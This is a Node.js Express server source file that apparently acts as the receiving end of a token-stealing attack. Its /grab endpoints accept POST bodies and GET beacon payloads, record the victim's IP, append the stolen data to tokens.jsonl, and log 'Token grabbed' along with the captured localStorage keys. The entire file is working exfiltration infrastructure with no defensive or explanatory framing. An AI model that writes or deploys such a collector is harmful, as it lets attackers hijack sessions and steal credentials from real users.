const express = require("express");
const fs = require("fs");
const app = express();

app.use(express.json({ limit: "2mb" }));
app.use(express.urlencoded({ extended: true }));

app.post("/grab", (req, res) => {
  const data = {
    ...req.body,
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
    received: new Date().toISOString()
  };
  fs.appendFileSync("tokens.jsonl", JSON.stringify(data) + "\n");
  console.log("[+] Token grabbed:", data.ip, Object.keys(data.localStorage || {}));
  res.status(200).end();
});

// beacon GET fallback
app.get("/grab", (req, res) => {
  try {
    const raw = req.query.d ? decodeURIComponent(req.query.d) : "{}";
    const data = JSON.parse(raw);
    data.ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    data.received = new Date().toISOString();
    fs.appendFileSync("tokens.jsonl", JSON.stringify(data) + "\n");
  } catch(e) {}
  res.status(200).end();
});

app.listen(3000, () => console.log("listening on :3000"));